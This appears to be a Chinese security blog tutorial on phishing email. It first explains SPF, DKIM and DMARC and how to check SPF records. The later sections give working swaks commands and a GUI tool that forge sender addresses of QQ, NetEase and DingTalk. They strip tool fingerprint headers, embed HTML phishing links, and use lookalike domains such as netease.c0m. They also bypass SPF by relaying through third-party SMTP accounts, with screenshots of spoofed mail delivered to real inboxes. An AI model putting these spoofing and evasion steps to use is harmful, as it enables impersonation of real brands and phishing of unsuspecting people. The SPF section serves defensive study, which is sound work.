---
title: APT攻击手段之钓鱼邮件
date: 2026-08-15 13:50:00
cover: https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/cover.webp
categories:
  - 攻防实战
tags:
  - APT
  - 钓鱼邮件
description: APT攻击手段之钓鱼邮件：SPF协议详解（DNS TXT记录、防伪造机制、验证结果）、邮件安全实战（钓鱼邮件制作、附件伪装、链接构造）。
---

> ⚠免责声明：本文所有技术仅用于网络安全合规学习、授权靶场实验。未经目标书面授权，禁止向任何人发送伪造钓鱼邮件，违规操作需要承担法律责任；文中邮箱、授权码全部为虚构示例， 不具备真实可用性。如需复现实验，必须自行准备合规邮箱账号。 
>



# 一、什么是 SPF 协议？
SPF 详解：[https://www.renfei.org/blog/introduction-to-spf.html](https://www.renfei.org/blog/introduction-to-spf.html)

## 1. 定义
**SPF（Sender Policy Framework，发件人策略框架）**，是一套**DNS记录**，用来**防止邮件伪造**，解决垃圾邮件、钓鱼邮件冒充你的域名发邮件的问题。

简单理解：告诉全世界哪些邮件服务器**允许代表你的域名发送邮件**，不是列表里的服务器发出来的邮件，大概率是伪造的。

---

## 2. 工作原理
1. 域名所有者，在DNS添加一条 `TXT` 类型的SPF记录；
2. 接收方邮件服务器收到一封邮件，看邮件头里的**发件人域名**；
3. 接收服务器去查询这个域名的SPF记录；
4. 拿发送这封邮件的**IP地址**和SPF记录允许的IP做比对：
    - ✅匹配：SPF验证通过
    - ❌不匹配：验证失败，可以拒收、标记为垃圾邮件

---

## 3. SPF记录示例（DNS TXT记录）
```plain
v=spf1 ip4:111.222.33.44 include:_spf.google.com ~all
```

字段拆解：

+ `v=spf1`：固定，SPF版本，只能是spf1
+ `ip4:x.x.x.x`：允许该IPv4发邮件
+ `ip6:::1`：允许IPv6地址
+ `include:xxx`：引入另一个域名的SPF规则（比如企业用谷歌/网易邮箱就需要include）
+ `~all`：**软失败**，不匹配时标记垃圾邮件，但不直接拒收
+ `-all`：**硬失败**，不匹配直接拒绝投递（推荐安全）
+ `?all`：中立，不做判断，几乎不用

⚠️重要限制：**SPF最多只能递归10次include**，超过会直接SPF失效，叫SPF递归超限。

---

## 4. SPF的验证结果
1. `pass`：通过，IP在允许列表
2. `fail`：硬失败，`‑all`，拒绝邮件
3. `softfail`：软失败，`~all`，标记垃圾邮件
4. `neutral`：`?all`，无态度
5. `none`：域名没有SPF记录

---

## 5. SPF 的缺点
1. **不能防转发**：邮件经过第三方转发服务器，源IP变成转发服务器IP，会导致SPF失败，这就是为什么需要**DKIM + DMARC**配合。
2. 只校验信封发件人（Mail From），不是看到的显示发件人，单纯SPF依然可以做显示名钓鱼。

---

## 6. 和DKIM、DMARC三者关系（邮件反伪造三件套）
1. **SPF**：校验发送服务器IP是否合法
2. **DKIM**：邮件内容数字签名，确认邮件没被篡改
3. **DMARC**：告诉收件服务器，SPF/DKIM失败之后该怎么做（隔离/拒绝），同时接收伪造邮件报告



SPF = IP白名单；DKIM = 邮件盖章；DMARC = 违规处理规则。

---

## 7. 查询是否配置 SPF
> SPF 存于 DNS **TXT 记录**，不是单独的SPF记录类型，记录固定开头：`v=spf1`
>

### 7.1 Windows cmd 查询
```plain
nslookup -type=TXT 你的域名
```

在输出结果里找有没有以 `v=spf1` 开头的 TXT 内容。

示例：

```plain
nslookup -type=TXT qq.com
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782724524_4n3yad.webp)

### 7.2 Linux / Kali 命令
#### 方式1 dig（推荐）
```bash
dig 域名 TXT
# 只过滤SPF结果
dig 域名 TXT | grep "v=spf1"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782727133_xeckh6.webp)

#### 方式2 host
```bash
host -t TXT 域名
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782728699_p09djw.webp)

#### 方式3 nslookup
```bash
nslookup -type=TXT 域名
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782730068_23g9hw.webp)

---

### 7.3 判断结果
#### 7.3.1 判断域名有没有配置SPF
1. 找到以 `v=spf1` 开头的TXT记录 → ✅已配置SPF
2. 所有TXT记录里面完全没有`v=spf1` → ❌未配置SPF，可以直接邮件伪造

> 注意：就算有很多其他TXT记录，只要没有`v=spf1`，依旧算无SPF。
>

⚠️ 硬性规则：一个域名只允许1条`v=spf1`记录；多条v=spf1，SPF直接失效。

#### 7.3.2 配置了SPF，看后缀all
示例记录：

```plain
"v=spf1 ip4:219.234.0.0/16 120.26.0.0/16 ~all"
```

这里是 `~all`（softfail 软失败）

| 后缀 | 含义 | 邮件伪造结果 |
| --- | --- | --- |
| `‑all` fail（硬失败） | 不在列表的IP直接拒绝邮件 | ✅防御成功，伪造失败 |
| `~all` softfail（软失败） | 接收邮件，标记为垃圾邮件 | 邮件依然可以送达，能伪造成功，只是进垃圾箱 |
| `?all` neutral（中立） | 不做校验判断，放行邮件 | 可以伪造 |
| `+all` pass（全部允许） | 允许任意IP发送，完全无防护 | 随便伪造，极度危险 |


#### 📝三步判断法
> 拿到nslookup / dig输出结果：
>

1. 看有没有 `v=spf1`
    - 没有 → 未配置SPF，可直接伪造
2. 有`v=spf1`，看末尾是什么`all`
    - `-all`：硬拒绝，伪造失败
    - `~all`：软失败，还能伪造，邮件可投递（垃圾箱）
    - `?all / +all`：可以伪造
3. 检查是否多条`v=spf1`，多条直接SPF整体失效，可以伪造



**误区**

❌误区：只要有SPF记录就防住伪造。  
✅真相：只有`‑all`硬拒绝才真正阻挡；`~all`软失败只是提醒，伪造邮件仍然可以送达。

---

### 7.4 在线工具（不方便敲命令时）
**MXToolbox**官网：[https://mxtoolbox.com/](https://mxtoolbox.com/)

**MXToolbox **拓展学习：[https://zhuanlan.zhihu.com/p/250224866](https://zhuanlan.zhihu.com/p/250224866)

**MXToolbox** 是国外非常常用的**免费在线邮件/DNS诊断网站**。

> 网安、邮件运维做题/实操经常见到，专门查邮件相关DNS：**MX、SPF、DKIM、DMARC、IP黑名单**。
>
> MXToolbox 是**在线网页工具**，用来可视化检测 SPF / DKIM / DMARC / MX 邮件DNS记录，替代手动dig分析。
>

#### 7.4.1 核心功能
1. **SPF Record Lookup**：查SPF记录，直接显示`v=spf1`内容，标出错误（多条SPF、include超限）
2. **MX Lookup**：查询邮件交换MX记录
3. **DKIM Lookup**：查DKIM公钥记录（需要填selector选择器）
4. **DMARC Lookup**：查`_dmarc`子域名的TXT记录
5. **Blacklist检查**：检测你的IP有没有进垃圾邮件黑名单DNSBL
6. DNS Lookup：查A、TXT、CNAME各类DNS记录
7. 邮件头分析：上传邮件原始头，自动解析SPF/DKIM/DMARC校验结果

#### 7.4.2 常见报错提示
+ `No SPF Record found`：没有配置SPF
+ `Multiple SPF Records`：多条v=spf1，**SPF直接失效**
+ `SPF includes exceed 10`：include递归超过10次，校验失败

#### 7.4.3 使用格式
```plain
命令:域名/IP
```



示例：

查询 SPF 协议网站：[https://mxtoolbox.com/spf.aspx](https://mxtoolbox.com/spf.aspx)

```plain
spf:qq.com
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782731591_p1musr.webp)

我们可以使用MXToolbox工具在线查询域名的SPF解析记录，以此判断域名的邮件防护策略。

  
本次查询`qq.com`得到SPF记录：`v=spf1 include:spf.mail.qq.com -all`。  
工具下方会自动执行多项合规检测，重点关注能够引发安全风险的检测项：

1. **SPF Record Published**  
判断DNS是否存在SPF记录。若无SPF记录，代表域名不存在来源IP校验，存在邮件伪造风险。
2. **SPF Multiple Records**  
DNS规范规定：一个域名仅允许存在**一条SPF记录**。如果存在多条SPF记录，SPF策略直接失效，外部主机能够伪造该域名邮件。
3. **SPF Contains characters after ALL**  
`-all`、`~all`这类匹配规则必须写在SPF记录末尾，all之后不能追加任何配置，否则整条策略失效。
4. **SPF Syntax Check**  
校验SPF语法正确性，语法错误将导致SPF配置无法生效。



其余检测项作为辅助校验：包含过时语法检测、DNS嵌套查询数量、include循环引用、重复引用检测。这类问题在大型正规企业域名中几乎不会出现，更多属于配置优化范畴。



本次qq.com所有检测项全部通过，代表SPF配置规范且生效。`-all`为严格模式，不在信任列表内的IP发送邮件会直接被拒收。这也解释了实验现象：**本机Kali直接伪造@qq.com信封发邮件，会触发SPF校验失败，返回550被拦截。**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782733638_y4jom4.webp)

---

# 二、如何实现邮件伪造？
## 1. 前置知识
SPF 协议是邮件的保护机制，也就是说，如果想进行邮件，那么必须绕过这个协议。

**邮件可以被伪造的根本原因**

> **SMTP 协议本身设计时，没有内置发送者身份校验机制。**
>

1. SMTP（简单邮件传输协议）只负责传输邮件，**默认不验证发件人身份**。
2. 在 SMTP 服务器转发邮件过程中，攻击者可以手动篡改发件人来源信息，欺骗接收方邮件服务器。
3. 如果域名**没有配置 SPF/DKIM/DMARC 这类防护机制**，接收服务器不会校验来源合法性，**邮件伪造就可以成功**。

---

## 2. 无 SPF 协议时邮件伪造
### 2.1 获取一个临时邮箱
临时邮箱：

[http://24mail.chacuo.net](http://24mail.chacuo.net)

[https://www.linshi-email.com/](https://www.linshi-email.com/)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782735303_xtgxnc.webp)

受害人：iqspgy68490@chacuo.net

---

### 2.2 邮件发送
#### 2.2.1 利用邮件伪造发送的工具
下载链接：[https://gitee.com/jasminee0762/cyber-security/blob/master/Tools/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0%E5%8F%91%E9%80%81%E7%AB%AF.zip](https://gitee.com/jasminee0762/cyber-security/blob/master/Tools/%E9%82%AE%E4%BB%B6%E4%BC%AA%E9%80%A0%E5%8F%91%E9%80%81%E7%AB%AF.zip)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782737165_wwuhqn.webp)



<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782738778_wbuetw.webp)<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782740173_vrekii.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782741929_aslvdi.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782743512_j1l40v.webp)

> `chacuo.net`：已经配置SPF，但用的是`~all`软失败，仍然可以实现邮件伪造，只是邮件大概率被标记垃圾邮件。
>





**FastMail（邮件特快专递）工具解析**

这是CTF/邮件伪造实验工具 **FastMail邮件特快专递（SendMail）**，Windows图形化SMTP邮件伪造工具。

> 背景：前面我们分析域名 `chacuo.net` SPF记录是 `~all`，**允许邮件伪造**。
>



**界面各个框含义**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782745196_djjtun.webp)

主发送窗口

1. **收件人**：`iqspgy68490@chacuo.net`

> 接收这封伪造邮件的邮箱，属于`chacuo.net`域名。
>

2. **主题**：钉钉软件更新

> 钓鱼邮件主题，欺骗收件人。
>

3. **附件**：可以添加恶意附件。
4. **发件人：**`dingding`** **`dingding@qq.com`

> ✨**邮件伪造核心！这里可以随便填，不需要真实拥有这个邮箱账号**
>

+ 前面`dingding`：**显示名**（收件人看到的发件人昵称）
+ 后面`dingding@qq.com`：**信封发件人Mail‑From**（邮件源头地址）

> 哪怕你根本没有 dingding@qq.com 账号，工具直接冒充这个地址往外发邮件。
>

5. **内容**：邮件正文内容；`以HTML格式发送`勾选可以写HTML钓鱼页面。
6. 【配置】按钮：弹出右边`SendMail配置`弹窗。
7. 发送、退出按钮。



SendMail配置弹窗

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782746470_tqh9jy.webp)

+ **普通方式发送(非速递)**：勾选就是走正常需要账号密码的SMTP服务器；**不勾选就是特快专递模式（直接连接目标MX服务器，伪造邮件，不需要账号密码！）**
+ 发件人：和主窗口同步，伪造的发件人
+ **SMTP：留空** → 特快专递模式，工具自动查询收件人域名的MX邮件服务器，直连对方邮件服务器发送伪造邮件。
+ 用户名、密码：**特快专递模式下全部留空，不需要填写账号密码**



两种模式区分

1. **特快专递模式（邮件伪造模式）**  
不勾选「普通方式发送」，SMTP/账号密码全部空。  
工具自动查收件域名MX记录，直连对方邮件服务器，**无需账号密码，伪造发件人**。
2. **普通方式发送（正常发邮件）**  
勾选普通方式发送；填写自己的SMTP服务器、账号密码，用自己真实邮箱发送邮件，**不能伪造发件人**。

---

#### 2.2.2 kali 系统中的邮件伪造工具
**swaks**

> swaks = Swiss Army Knife SMTP，SMTP 瑞士军刀，命令行实现邮件伪造，对应 Windows 的 FastMail 特快专递。 原理：自动解析收件域名 MX 记录，直连对方 25 端口 SMTP 服务器，**不需要账号密码**。  
>

**基础伪造命令模板：**

```bash
swaks --to 收件人@shturl. --from 伪造发件人@qq.com -ehlo qq.com --body "邮件正文" --header "Subject:邮件主题"
```

 参数详解：

| 参数 | 说明 |
| --- | --- |
| `--to` | 收件邮箱，目标接收方 |
| `--from` | **伪造信封发件人 Mail‑From**，可以随便写，不需要拥有该邮箱 |
| `‑ehlo 域名` | EHLO 握手，伪装客户端来源域名 |
| `--body` | 邮件正文内容 |
| `--header "Subject:xxx"` | 邮件主题，**Subject: 不能省略** |


 ❗注意：中文需要编码。  

---

<font style="background-color:#FCE75A;">如果 命令中</font>**<font style="background-color:#FCE75A;">不加 </font>**`**<font style="background-color:#FCE75A;">Subject</font>**`

> ****邮件数据包不存在主题字段；邮箱列表不会展示自定义标题，不会自动生成标题文本。界面看到的日期是邮件内置`Date`头，不属于标题。  
>

```bash
swaks --to rgvpkd96312@chacuo.net --from admin@qq.com --ehlo qq.com --header "test" --body "hello"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782748226_48eqew.webp)



---



受害人：vtsbgk92086@chacuo.net

```bash
swaks --to vtsbgk92086@chacuo.net --from admin@qq.com --ehlo qq.com --header "Subject:test" --body "hello"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782749915_oo7adr.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782751705_zflyvy.webp)

---

<font style="background-color:#FCE75A;">标题仅支持纯英文、数字（ASCII 字符） </font> 

> 邮件body正文靠`Content‑Type:xxx;charset=utf‑8`。
>
> 而 RFC2047 专门解决：**邮件头里面传递非英文文字**的标准。  
>

如果我们输入中文标题：测试，标题不会显示

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782753438_j92n8t.webp)



邮件头部不支持中文，RFC2047 协议使用 `=?charset?B?base64?=` 格式对 Subject 中文进行封装；swaks 不会自动做这个封装，需要手动写。

```bash
swaks --to 收件箱@shturl. --from admin@qq.com --ehlo qq.com --body "正文中文直接写" --header "Subject:=?UTF-8?B?这里替换你的中文base64结果?="
```

参数详解：

| 片段 | 含义 |
| --- | --- |
| `=?` | 标记开始，告诉邮件客户端：这串是经过编码的多语言文本 |
| `UTF‑8` | 原始文字使用的字符集 |
| `B` | B = Base64 编码；还有一个 Q=Quoted‑Printable 编码，邮件大多用 B |
| 标题内容 | **UTF‑8 编码之后再做 Base64 得到的字符串** |
| `?=` | 编码串结束标记 |


**Q1: 什么叫UTF‑8？**

+ 汉字在计算机要变成二进制字节，UTF‑8就是一套汉字转字节的规则。
+ `echo -n "系统更新"`输出的就是这套二进制；
+ `base64`再把二进制转成可打印的英文字符串，邮件头只能传递ASCII。

---

  
**怎么将“测试”转 UTF‑8 + Base64？**

>  Linux (Kali) 里，`**echo -n "文字"**`** 默认输出就是 UTF‑8 字节**，不需要额外再做 “转 UTF‑8” 操作。  
>

完整链路： 中文汉字 →(echo输出)→ UTF‑8二进制字节 →(base64)→ base64字符串 →(包外壳)→`=?UTF‑8?B?xxx?=`



方案一：kali 命令

第1步：得到中文的UTF‑8原始字节

```plain
echo -n "测试"
```

+ `-n`：禁止末尾自动加换行，换行不能算进内容里。
+ 在Kali环境，双引号内中文输出编码就是**UTF‑8**。

Windows cmd不是默认UTF‑8，**这个操作只在Kali/WSL里用**。



第2步：把UTF‑8字节做Base64编码

管道交给base64工具：

```plain
echo -n "测试" | base64
```

输出：`5rWL6K+V`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782755907_1m9kgy.webp)

第3步：套上RFC2047外壳

```plain
=?UTF-8?B?5rWL6K+V?=
```

---

方案二：Python

```python
import base64
title = "测试"
# 1.字符串编码为utf‑8字节
utf8_bytes = title.encode("utf‑8")
# 2.字节做base64
b64_str = base64.b64encode(utf8_bytes).decode("ascii")
# 3.套RFC2047外壳
subject = f'=?UTF-8?B?{b64_str}?='
print(subject)
```

输出：

```plain
=?UTF-8?B?5rWL6K+V?=
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782757156_lj31dp.webp)



受害人：voljbz32584@chacuo.net

```bash
swaks --to voljbz32584@chacuo.net --from admin@qq.com --ehlo qq.com --body "hello" --header "Subject:=?UTF-8?B?5rWL6K+V?="
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782758916_ui53yr.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782760537_bj5f9u.webp)



正文中文：写上 `Content‑Type: text/html;charset=utf‑8`

```bash
swaks --to voljbz32584@chacuo.net --from admin@qq.com --ehlo qq.com --header "Content-Type: text/html;charset=utf-8" --header "Subject:=?UTF-8?B?5rWL6K+V?=" --body "我们做了一个测试"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782762543_s80ezu.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782764983_cfu6qu.webp)

正文也可以不写 charset=utf‑8，但会出现概率性乱码  swaks 发出的字节本身就是 UTF‑8 中文；**部分临时邮箱 (chacuo、iwatermail) 会自动猜编码，中文可以正常显示**，你看上去一切正常。但是正规邮箱（QQ 邮箱、163）不知道你的正文是什么编码，它会猜 GBK、ISO‑8859‑1，**直接出现一堆问号、乱码**。



---

****

**完整伪装命令**

在基础命令之上，增加多套伪装参数，抹掉工具痕迹、伪造发件人昵称、支持 HTML + 中文，偏向模拟钓鱼邮件。  

```bash
swaks --to 收件邮箱@xxx.net --from "显示昵称<伪造邮箱@qq.com>" --ehlo 伪装主机名 --header-X-Mailer "" --header-Message-Id "" --header "Content-Type: text/html;charset=utf-8" --header "Subject:=?UTF-8?B?中文标题RFC2047串?=" --body "邮件正文，可写html<a href='链接'>点击</a>"
```

1. `**--to **` 收件邮箱，邮件发给这个地址
2. `**--from** "QQ 管理<admin@qq.com>"`
+ 显示昵称：`QQ 管理`（收件人界面看到的名字）
+ 信封发件地址：`admin@qq.com`（SMTP层真实发件人地址，用于钓鱼伪装）
3. `**--ehlo** xxx` SMTP握手时上报的主机名，随便填写，属于伪装项。
4. `**--header‑xxx ""**`，专门修改**swaks自动生成的头部，清空指纹**。
+ `--header-Message-Id ""` 清空 swaks 自动生成带工具特征的 Message‑Id，由邮件服务器重新生成普通ID。
+ `--header-X-Mailer ""` 清除 swaks 默认自带的 `X‑Mailer: swaks xxx` 指纹头，隐藏工具特征。
5. `**--header "Content-Type: text/html;charset=utf-8"**`
+ `text/html`：正文支持 HTML，可以写超链接、网页标签
+ `charset=utf‑8`：声明正文编码，保证body里中文不乱码
7. `**--header "Subject:=?UTF-8?B?**<font style="color:#DF2A3F;">xxx</font>**?="**``xxx` 要转成 UTF‑8‑Base64，再套上 RFC2047外壳，实现中文主题。

注意：Subject（邮件头部中文）必须这套编码，**正文不需要**。

8. `**--body** "xxx"` 邮件正文。
+ 想要插入钓鱼链接，body写成html，示例：

```plain
--body "我们做了一个测试，请<a href='链接'>点击这里</a>"
```



---



受害人：qjyfvs50428@chacuo.net

```bash
swaks --to qjyfvs50428@chacuo.net --from "QQ 管理<admin@qq.com>" --ehlo xiaolin --header-X-Mailer "" --header-Message-Id "" --header "Content-Type: text/html;charset=utf-8" --header "Subject:=?UTF-8?B?5rWL6K+V?=" --body "我们做了一个测试"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782766650_68w372.webp)

和之前的区别是

```plain
→ Message-Id:
→ X-Mailer:
```

**这两行头部，值是空的，什么内容都没有输出 ，达到了清除指纹的效果。**

字段存在，但是没有内容，指纹信息消失。接收服务器后续会自己生成一个正常的Message‑Id。

不加参数时swaks会自动填充：

```plain
X‑Mailer: swaks v2020xxxx
Message‑Id: <一串带swaks特征的id>
```

接收方看到就知道这是swaks工具发送。



 SMTP 交互  

1. EHLO xiaolin ✔ ehlo伪装生效
2. MAIL FROM:`<QQ 管理<admin@qq.com>>` ✔ 发件人昵称生效
3. Subject:`=?UTF‑8?B?5rWL6K+V?=` ✔ RFC2047中文标题编码
4. `Message‑Id:` 、`X‑Mailer:` 后面为空 ✔指纹清除成功
5. `Content‑Type: text/html;charset=utf‑8` ✔ HTML+UTF‑8声明
6. 最后返回`250 Ok`，邮件发送成功。



<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782768773_qnh2vf.webp)

---

## 3. 配置 SPF 协议时邮件伪造
> 前提：目标域名配置了**SPF**，直接伪造对方信封发件地址会被SPF拦截。分**软刚伪造、硬刚伪造（转发突破）**。
>

### 场景：
> 攻击者：<font style="color:rgb(33, 41, 58);">xxx@163.com</font>
>
> <font style="color:rgb(33, 41, 58);">网易官方邮箱：</font><font style="color:rgb(88, 94, 109);">club@service.netease.com</font>
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782770406_k7zc40.webp)
>
> 受害者：37xxx@qq.com
>

```bash
swaks --to 37xxx@qq.com --from club@service.netease.com --ehlo 163.com --header-X-Mailer "" --header-Message-Id "" --header "Content-Type: text/html;charset=utf-8" --header "Subject:=mail" --body "hello"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782771810_djh3uf.webp)`550 SPF check failed` → **SPF 校验失败，邮件被 QQ 邮件服务器直接拒绝投递**。  

**失败原因：**Kali本机IP直接伪造网易域名作为信封发件人发送邮件，源IP不在网易SPF允许列表，SPF校验失败被QQ服务器550拒收，修改EHLO 为 <font style="color:rgb(33, 41, 58);">163.com</font> 无法绕过SPF。



以下是两种解决思路：

---

### 3.1 软刚伪造（打字眼 · 视觉欺骗）
#### 3.1.1 原理
不伪造官方真实域名的信封地址，**只欺骗人的眼睛，不欺骗邮件服务器**。  
利用形近字符、数字替换字母、仿冒中文显示昵称；信封使用攻击者自己控制的域名，SPF直接放行。

> SPF**只校验信封发件地址，完全不校验发件人显示昵称**。
>

#### 3.1.2 欺骗手段
1. 数字替换字母：`com→c0m`、`aliyun→a1iyun`
2.  形近 Unicode 字符： 比如全角字母、西里尔字母，视觉和英文字母一模一样。[https://hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/homograph-attacks.html](https://hacktricks.wiki/en/generic-methodologies-and-resources/phishing-methodology/homograph-attacks.html) 
3. 大小写混淆：`service → Service`（域名大小写不敏感）
4. 伪造中文显示昵称（最核心欺骗点）

>  SPF**完全不校验显示昵称**，可以任意写官方名字。  
>
>  邮箱界面优先展示中文昵称，普通用户很少点开查看完整信封邮箱地址。  
>

```plain
--from "网易邮件中心<club@service.netease.c0m>"
--from "腾讯安全中心<admin@tenc0nt.com>"
```

5.  多加点、子域名混淆：看起来像官方子域名，实际完全不同。
+ 真实：`mail.163.com`
+ 伪造 1：`mail163.com`（少个点）
+ 伪造 2：`mail.163.c0m`
+ 伪造 3：`163.service‑mail.com`，看上去和网易相关，实际是攻击者域名
6.  后缀增加字符（多后缀） 
+ 真实`netease.com` 
+ 伪造：`netease.com.cn` / `netease.comm`，肉眼扫一眼不容易发现末尾多字符。  

#### 3.1.3 特点
+ ✅不需要第三方邮箱账号，**Kali本机直接发包**
+ ✅SPF直接通过，**不是绕过SPF，本身就不触碰对方SPF域名**
+ ❌服务器层面一眼识别，全靠人眼分辨；懂安全的人查看原始邮件可识破

#### 3.1.4 实操
不要直接用真实网易域名，改用形近伪造域名  

例如：

```bash
--to xxx@qq.com --from "网易邮件中心<club@Service.netease.c0m>" --ehlo 163.com --header-X-Mailer "" --header-Message-Id "" --header "Content-Type: text/html;charset=utf-8" --header "Subject:=?UTF-8?B?57O757uf5YiG5paw?=" --body "hello"
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782773964_er6taa.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782776013_v38xlv.webp)

容易进垃圾邮箱 ！！！

---

### 3.2 硬刚伪造（转发突破 · SMTP中转绕过SPF）
#### 3.2.1 原理
1. 注册正常第三方邮箱（163/QQ 邮箱），开启 POP3/SMTP 服务，获取**SMTP 授权码**。
2. swaks 充当邮件客户端，登录第三方官方 SMTP 服务器，**由服务商官方 IP 代为发送邮件**。
3. SPF 校验发送服务器源 IP，此时 IP 是服务商合法 IP，实现**绕过 SPF 检测**。

> ⚠注意：
>
> 信封`--from`必须和登录的邮箱账号一致；
>
> 伪装昵称、主题、钓鱼链接写在`.eml`邮件模板内。
>
> DKIM开启时该方法依然会被拦截，仅绕过SPF。
>

---

#### 3.2.2 特点
+ ✅由正规服务商服务器发出，**绕过SPF校验**
+ ✅欺骗服务器SPF；显示昵称欺骗用户
+ ❌需要第三方邮箱账号 + POP3/SMTP授权码；DKIM会拦截

---

### Q1：什么是 POP3/SMTP 服务？
**POP3**：接收邮件协议，把服务器邮件下载到本地客户端（Foxmail、Outlook、swaks），端口 110/995。

**SMTP**：发送邮件协议，客户端登录邮箱官方服务器向外发送邮件，端口 25/465/587。

---

### Q2：什么是授权码？ 为什么授权码不能泄露  ？
开启邮箱POP3/SMTP服务后生成的专用客户端密码，**≠网页登录密码**。  
用来给第三方工具（swaks、Foxmail）登录SMTP服务器收发邮件。



如果授权码泄露，攻击者不需要你的网页账号密码，就可以：

1. 登录你的SMTP服务器，**冒用你的邮箱对外批量发送钓鱼、垃圾邮件（硬刚邮件伪造）**。
2. 通过POP3协议接收、读取你邮箱全部收件邮件。
3. 滥发邮件会导致你的邮箱账号被封禁、IP被拉黑。

> 注意：授权码拥有完整客户端权限，泄露等于邮箱半失守。
>



对比：网页密码 vs SMTP授权码

+ 网页密码：网页端登录邮箱。
+ SMTP授权码：给外部程序使用，可独立重置、关闭；**一旦泄露立刻在邮箱后台重置/关闭POP3/SMTP服务**。

---

### Q3： 怎么开启POP3/SMTP 服务？
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782777496_emk01m.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782779425_uc7ls4.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782781945_r4g9ug.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/APT攻击手段之钓鱼邮件/1786782784123_89xfbt.webp)

 ⚠️  注意： SMTP 授权码用于第三方工具登录邮箱 SMTP 服务，一旦泄露攻击者可利用该账号发送钓鱼邮件、读取邮箱邮件，造成账号滥用与信息泄露，因此授权码不能泄露。  

---

#### 3.1.3 硬刚伪造命令
```bash
swaks --to 目标邮箱 --from 登录账号 --data 模板文件.eml --server SMTP服务器地址 -p 端口 -au 登录账号 -ap 授权码
```

参数解释

| 参数 | 说明 |
| --- | --- |
| `--to` | 目标收件邮箱 |
| `--from` | 信封发件人，必须等于登录的第三方账号 |
| `--data` | 加载eml模板，内部自定义显示昵称、主题、HTML钓鱼正文 |
| `--server smtp.xxx` | 使用 xxxSMTP服务器中转 |
| `-p 25` | SMTP端口 |
| `-au` | SMTP登录账号 |
| `-ap` | POP3/SMTP授权码（不是网页登录密码） |


| 替换变量 | 说明 |
| --- | --- |
| `目标邮箱` | 接收邮件人的邮箱 |
| `登录账号` | 开启 POP3/SMTP 的第三方邮箱账号，`--from`<br/>与`‑au`<br/>必须一致 |
| `模板文件.eml` | eml 伪装模板文件名 |
| `SMTP服务器地址` | 163：smtp.163.com<br/>；QQ：smtp.qq.com |
| `端口` | 25（明文）、465（SSL，推荐，需加`‑tls`<br/>） |
| `授权码` | 邮箱后台生成的客户端授权码，**不是网页登录密码** |


---

